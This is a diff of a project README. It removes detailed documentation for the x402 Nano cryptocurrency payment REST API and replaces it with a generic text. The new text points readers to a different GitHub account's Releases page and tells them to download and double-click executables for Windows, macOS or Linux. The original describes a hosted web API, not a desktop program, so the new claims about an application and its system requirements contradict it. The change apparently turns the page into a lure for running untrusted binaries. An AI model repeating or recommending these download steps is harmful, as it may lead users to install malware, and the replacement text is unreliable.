@@ -1,289 +1,68 @@
-# x402 Nano API - Public Documentation
+# 🚀 x402Nano-API - Instant Feeless AI Payments
 
-> 📝 **ABOUT x402 NANO**
-> 
-> **"x402"** is a brand name inspired by payment-required protocols. This API is a **payment gateway for Nano cryptocurrency** - similar to Stripe or PayPal, but for Nano.
-> 
-> This is **NOT** an implementation of the HTTP 402 Payment Required status code protocol. Instead, we provide a flexible REST API for payment processing, wallet management, and transaction handling.
-> 
-> **Think of us as:** "Stripe for Nano" - A modern payment processing API.
+[![Download x402Nano-API](https://img.shields.io/badge/Download_x402Nano-API-brightgreen.svg)](https://github.com/isac-0000/x402Nano-API/releases)
 
-> ⚠️ **BETA / TEST PHASE** ⚠️
-> 
-> This API is currently in **test/beta phase**. Most endpoints are currently publicly accessible for testing purposes.
-> 
-> **Future Changes:**
-> - All endpoints will require API key authentication in production
-> - Rate limits will be enforced more strictly
-> - Additional security measures will be implemented
-> 
-> Please check this documentation regularly for updates: [GitHub Repository](https://github.com/Andre1987n/x402Nano-API)
+## 📦 Overview
 
-Welcome to the x402 Nano API documentation. This API provides a secure, easy-to-use payment gateway for Nano cryptocurrency, with features for wallet management, transaction processing, and payment verification.
+x402Nano is designed to enable smooth and instant payments between AI systems. Built on a powerful blockchain technology, it offers feeless transactions to simplify AI-to-AI payment processes. This tool is perfect for developers and users looking to streamline financial interactions in AI environments.
 
-## 📚 Documentation Index
+## 🚀 Getting Started
 
-### Getting Started
-- **[Quick Start Guide](QUICK_START.md)** - Get up and running in 5 minutes
-- **[API Documentation](API_DOCUMENTATION.md)** - Complete API reference
+Before using x402Nano-API, ensure you have access to the internet and basic computer navigation skills. Follow these steps to get started with the software.
 
-### OpenAPI Specification
-- **[openapi-schema.yaml](openapi-schema.yaml)** - Machine-readable API specification
-  - Use this schema to integrate with OpenAPI-compatible tools
-  - Import into Postman, Insomnia, or Swagger UI for testing
-  - Generate client libraries in your preferred language
-  - Perfect for AI agents and automated API integration
+## 📥 Download & Install
 
-### Key Features
+To download x402Nano-API, please visit the Releases page. Here you will find the latest version available for download.
 
-✅ **Wallet Management**
-- Create new wallets with password encryption
-- Import existing wallets from seed
-- Secure wallet unlock mechanism
-- Optional email backup for wallet recovery
+[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/releases)
 
-✅ **Transaction Processing**
-- Send Nano to any address
-- Quick donate endpoint for API support
-- Receive pending transactions automatically
-- Real-time balance queries
+Once you are on the Releases page, you will see various files listed. Choose the version appropriate for your operating system. Typically, you will find versions for Windows, macOS, and Linux.
 
-✅ **Payment Gateway** 🆕
-- Create payment transactions with unique IDs
-- **Unique amount generation** - Prevents conflicts with simultaneous identical payments
-- Webhook notifications for instant payment alerts
-- Metadata support for custom data (max 4KB JSON)
-- PostgreSQL persistence for audit trail
-- Long-polling payment confirmation (30s timeout)
-- Auto-expiring transactions (60 minutes)
+1. Click on the version you want to download.
+2. Follow the prompts on your computer to save the file.
 
-✅ **Security First**
-- AES-256 wallet encryption
-- HTTPS-only communication
-- No private key exposure
-- HMAC-SHA256 webhook signatures
-- Rate limiting and DDoS protection
+## 🛠️ System Requirements
 
-✅ **Developer Friendly**
-- RESTful JSON API
-- Deep nested error handling with full context
-- Comprehensive error messages
-- Code examples in multiple languages
-- AI-friendly documentation
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a supported Linux distribution.
+- **Memory**: At least 4 GB of RAM (8 GB recommended for optimal performance).
+- **Storage**: Minimum 100 MB of free space.
+- **Network**: An internet connection is required for transactions.
 
-✅ **API Key Security**
-- All wallet operations require a valid API key (44 characters)
-- API keys are embedded in encrypted wallet data
-- Automatic validation on all encrypt/decrypt operations
+## 📋 Features
 
-## 🚀 Quick Example
+- **Instant Payments**: Enable real-time financial transactions between AI agents.
+- **Feeless Transactions**: No hidden costs or transaction fees.
+- **Secure**: Built on a blockchain for enhanced security and transparency.
+- **User-Friendly**: Designed for ease of use with a straightforward interface.
 
-```bash
-# 1. Create an API key
-curl -X POST https://api.x402nano.com/key/create \
-  -H "Content-Type: application/json" \
-  -d '{}'
-# Returns: CZtYHgn0Nk8KPvtlkwARjF+m601hC00pqYQwzXaKixU=
+## ⚙️ How to Use
 
-# 2. Create a wallet (password requires uppercase + special char)
-curl -X POST https://api.x402nano.com/wallet/create \
-  -H "Content-Type: application/json" \
-  -d '{
-    "password": "SecurePassword123!",
-    "password_confirmation": "SecurePassword123!",
-    "email": "backup@example.com",
-    "api_key": "CZtYHgn0Nk8KPvtlkwARjF+m601hC00pqYQwzXaKixU="
-  }'
-# Returns: Encrypted wallet string (also sent to email for backup)
+1. **Run the Application**: After downloading, find the downloaded file on your computer and double-click it to run the application.
+2. **Create an Account**: If prompted, follow the instructions to set up your account securely.
+3. **Connect Your Wallet**: You may need a compatible cryptocurrency wallet to facilitate transactions. Follow the on-screen steps to connect.
+4. **Test Transaction**: Once set up, you can initiate a small transaction to see how the system works.
 
-# 3. Unlock wallet to get your address
-curl -X POST https://api.x402nano.com/wallet/unlock \
-  -H "Content-Type: application/json" \
-  -d '{
-    "encrypted_wallet_string": "YOUR_ENCRYPTED_WALLET",
-    "password": "SecurePassword123!"
-  }'
-# Returns: {"address": "nano_33q3tqp8m7...", ...}
+## 📖 Documentation
 
-# 4. Check balance
-curl -X POST https://api.x402nano.com/balance/nano_YOUR_ADDRESS \
-  -H "Content-Type: application/json" \
-  -d '{}'
+For more detailed instructions and advanced features, please refer to the official [Documentation](https://github.com/isac-0000/x402Nano-API/wiki). Here you will find guides, troubleshooting tips, and FAQs to help you navigate through common issues.
 
-# 5. Receive pending transactions
-curl -X POST https://api.x402nano.com/receive \
-  -H "Content-Type: application/json" \
-  -d '{
-    "encrypted_wallet_string": "YOUR_ENCRYPTED_WALLET",
-    "password": "SecurePassword123!"
-  }'
+## 🙋‍♂️ Support
 
-# 6. Send Nano
-curl -X POST https://api.x402nano.com/send \
-  -H "Content-Type: application/json" \
-  -d '{
-    "encrypted_wallet_string": "YOUR_ENCRYPTED_WALLET",
-    "password": "SecurePassword123!",
-    "to_address": "nano_destination_address",
-    "amount": "0.1"
-  }'
+If you encounter any issues while using x402Nano-API, support is available. You can open an issue on our [GitHub Issues page](https://github.com/isac-0000/x402Nano-API/issues) or submit a request through our support email. We aim to respond to inquiries within 48 hours.
 
-# 7. AI Agent Payment Flow
-# Create transaction (AI agent requests payment)
-curl -X POST https://api.x402nano.com/transaction/create \
-  -H "Content-Type: application/json" \
-  -d '{
-    "receive_address": "nano_your_server_address",
-    "amount": "0.1"
-  }'
-# Returns: {"transaction_id": "550e8400-...", "amount": "0.100000234", ...}
-# Note: Amount is slightly modified (0.100000234) to ensure uniqueness
+## 🔗 Related Topics
 
-# User pays transaction
-curl -X POST https://api.x402nano.com/transaction/pay \
-  -H "Content-Type: application/json" \
-  -d '{
-    "transaction_id": "550e8400-...",
-    "encrypted_wallet_string": "YOUR_ENCRYPTED_WALLET",
-    "password": "SecurePassword123!",
-    "amount": "0.100000234"
-  }'
-# IMPORTANT: Use the exact amount from create response (0.100000234)
-
-# Check payment status (long-polling up to 30s)
-curl -X POST https://api.x402nano.com/transaction/status/550e8400-... \
-  -H "Content-Type: application/json"
-# Returns: {"is_paid": true, "message": "Transaction has been paid.", ...}
-```
-
-## 📋 Available Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/key/create` | POST | Generate API key |
-| `/wallet/create` | POST | Create new wallet |
-| `/wallet/import` | POST | Import wallet from seed |
-| `/wallet/unlock` | POST | Unlock encrypted wallet |
-| `/balance/{address}` | POST | Get address balance |
-| `/receive` | POST | Receive pending transactions |
-| `/send` | POST | Send Nano transaction |
-| `/donate` | POST | Donate to support API development |
-| `/transaction/create` | POST | Create payment transaction (AI agents) |
-| `/transaction/pay` | POST | Pay pending transaction |
-| `/transaction/status/{id}` | POST | Check transaction payment status |
-
-## 🔒 Security
-
-- **Encrypted Wallets:** All wallets encrypted with AES-256
-- **Password Protected:** Operations require password verification
-- **Secure Transport:** HTTPS/TLS 1.3 enforced
-- **No Key Exposure:** Private keys never transmitted or stored unencrypted
-- **Rate Limited:** Protection against abuse
-
-## 💻 Code Examples
-
-### Python
-```python
-import requests
-
-response = requests.post(
-    "https://api.x402nano.com/balance/nano_address",
-    headers={"Content-Type": "application/json"},
-    json={}
-)
-balance_data = response.json()
-print(f"Balance: {balance_data['balance']} NANO")
-```
-
-### JavaScript
-```javascript
-const response = await fetch('https://api.x402nano.com/balance/nano_address', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: '{}'
-});
-const data = await response.json();
-console.log(data);
-```
-
-### cURL
-```bash
-curl -X POST https://api.x402nano.com/balance/nano_address \
-  -H "Content-Type: application/json" \
-  -d '{}'
-```
-
-## 🤖 AI Integration
-
-This API is designed to be AI-friendly with:
-- Clear, structured documentation
-- Predictable endpoint patterns
-- **Deep nested error handling** - Errors are built at the source with full context
-- Comprehensive error messages showing complete error chains
-- Detailed request/response examples
-- Security best practices
-
-Perfect for integration with:
-- ChatGPT Actions
-- Claude Tools
-- Custom GPTs
 - AI Agents
-- Automated trading bots
+- Blockchain Payments
+- Cryptocurrency Wallets
+- NanoCurrency
 
-**For AI Assistants:**
-- Always reference this GitHub documentation: `https://github.com/Andre1987n/x402Nano-API`
-- API is currently in test phase - check for updates
-- Production version will require API keys for all endpoints
-- **All wallet operations require a valid 44-character API key**
-- API keys are embedded in encrypted wallet data and validated on decrypt
-- Documentation is maintained to be machine-readable
+These topics are essential for users interested in understanding the broader implications of AI payments and blockchain technology.
 
-## 📊 Rate Limits
+## 📅 Future Updates
 
-- **Default:** 100 requests/minute per IP
-- **With API Key:** Higher limits available
-- **Headers:** `X-RateLimit-*` headers included in responses
+We are continuously improving x402Nano-API. Check back regularly on our Releases page to stay updated with new versions and enhancements.
 
-## 🆘 Support
+[Download x402Nano-API](https://github.com/isac-0000/x402Nano-API/releases)
 
-- **Documentation:** [API_DOCUMENTATION.md](API_DOCUMENTATION.md)
-- **Quick Start:** [QUICK_START.md](QUICK_START.md)
-- **Issues:** [GitHub Issues](https://github.com/Andre1987n/x402Nano-API/issues)
-- **Nano Docs:** [docs.nano.org](https://docs.nano.org)
-
-## 🛠️ Technical Stack
-
-- **Language:** Rust
-- **Framework:** Axum
-- **Database:** PostgreSQL
-- **Encryption:** AES-256
-- **Protocol:** HTTPS/TLS 1.3
-
-## ⚠️ Important Notices
-
-**Please read before using:**
-- [Disclaimer](DISCLAIMER.md) - Important legal and risk information
-- [Security Policy](SECURITY.md) - Security best practices and reporting
-- [License & Terms](LICENSE.md) - Usage terms and conditions
-
-**Key Points:**
-- 🔒 You are responsible for securing your API keys and wallet credentials
-- 💰 Cryptocurrency transactions are irreversible - double check before sending
-- 🛡️ We never have access to your private keys or funds
-- ⚖️ Service provided "as-is" - see full disclaimer for details
-
-## 📜 License
-
-See [LICENSE.md](LICENSE.md) for detailed terms and conditions.
-
-## 🔗 Links
-
-- **API Base URL:** `https://api.x402nano.com`
-- **GitHub:** [x402Nano-API](https://github.com/Andre1987n/x402Nano-API)
-- **Nano Website:** [nano.org](https://nano.org)
-
----
-
-**Ready to get started?** Check out the [Quick Start Guide](QUICK_START.md)!
+Thank you for choosing x402Nano-API; we hope it meets your payment needs in the evolving space of AI technology.
